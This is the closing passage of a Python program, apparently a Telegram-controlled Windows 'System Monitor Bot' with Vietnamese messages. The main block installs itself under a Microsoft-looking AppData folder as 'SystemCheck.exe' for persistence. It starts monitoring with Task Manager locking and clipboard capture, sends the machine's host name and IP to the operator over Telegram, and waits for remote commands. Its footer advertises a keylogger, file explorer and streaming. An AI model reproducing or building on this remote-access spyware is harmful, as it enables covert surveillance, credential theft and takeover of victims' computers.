        bot.answer_callback_query(c.id, "❌ Không nhận diện")

    except Exception as e:
        logger.error(f"Callback handler error: {e}", exc_info=True)
        try:
            bot.answer_callback_query(c.id, f"❌ Lỗi: {str(e)[:50]}")
        except:
            pass

# ==============================================================================
# MAIN
# ==============================================================================

if __name__ == "__main__":
    try:
        # Check persistence
        appdata = os.getenv('APPDATA')
        target_dir = os.path.join(appdata, "Microsoft", "Windows", "SystemMonitor")
        current_exe = sys.executable if getattr(sys, 'frozen', False) else __file__
        target_exe = os.path.join(target_dir, "SystemCheck.exe")
        
        check_integrity(target_dir, target_exe, current_exe)
        
        # Start monitor thread
        monitor = SystemMonitor(ADMIN_ID, bot, config)
        # Restore persisted runtime flags
        monitor.update_flags(
            block_mode=block_mode_active,
            taskmgr_locked=taskmgr_locked,
            intrusion_alert=intrusion_alert_active,
            clipboard_monitor=clipboard_monitor_on,
        )
        monitor_thread = threading.Thread(target=monitor.run, daemon=True)
        monitor_thread.start()

        # Register Telegram slash commands
        _setup_bot_commands()

        # Periodic firewall refresh for blocked sites (CDN IPs may change)
        def firewall_refresh_loop():
            while True:
                try:
                    refresh_firewall_blocks(BLOCKED_DATA.get("sites", []))
                except Exception as e:
                    logger.error(f"Firewall refresh loop error: {e}")
                time.sleep(1800)  # 30 minutes

        threading.Thread(target=firewall_refresh_loop, daemon=True).start()
        
        logger.info(f"✅ Bot Started. ID: {ADMIN_ID}")
        logger.info(f"🟢 SYSTEM ONLINE | Host: {platform.node()}")
        
        try:
            bot.send_message(
                ADMIN_ID,
                f"🟢 **SYSTEM ONLINE**\n"
                f"Host: {platform.node()}\n"
                f"IP: {socket.gethostbyname(socket.gethostname())}\n"
                f"Khởi động: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}",
                parse_mode="Markdown"
            )
        except:
            pass
        
        # Polling
        while True:
            try:
                bot.infinity_polling(timeout=10, long_polling_timeout=5, skip_pending=True)
            except Exception as e:
                logger.error(f"Polling error: {e}", exc_info=True)
                time.sleep(5)
    
    except Exception as e:
        logger.critical(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)

# ═══════════════════════════════════════════════════════════════
# Developer: TsByin
# Project: V12 System Monitor Bot — Hardened & Full-Featured
# Version: 12.0 (Bugs, FileExplorer, MP4, Watchdog, Keylogger,
#          StatePersist, AuditLog, /status, /disk, /ps-filter,
#          /net, /events, ClipMonitor, /stream, /reload)
# ═══════════════════════════════════════════════════════════════